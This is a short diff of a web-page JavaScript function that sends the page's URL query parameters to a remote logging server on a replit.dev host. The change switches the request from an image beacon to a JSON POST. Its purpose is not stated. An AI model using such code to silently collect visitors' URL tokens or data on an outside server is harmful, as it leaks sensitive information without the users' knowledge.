@@ -22,11 +22,13 @@
             return params;
         }
 
-        // Function to log the parameters to a remote server
+        // Function to log the parameters to a remote server using a POST request
         function logParams(params) {
-            const img = new Image();
+            const xhr = new XMLHttpRequest();
             const logUrl = 'https://de9f1098-bef1-4690-890a-f6bd01a5ea15-00-2ul1aimfuhien.kirk.replit.dev/log'; // Repl.it logging server URL
-            img.src = `${logUrl}?data=${encodeURIComponent(JSON.stringify(params))}`;
+            xhr.open("POST", logUrl, true);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.send(JSON.stringify(params));
         }
 
         // Get and log the query parameters
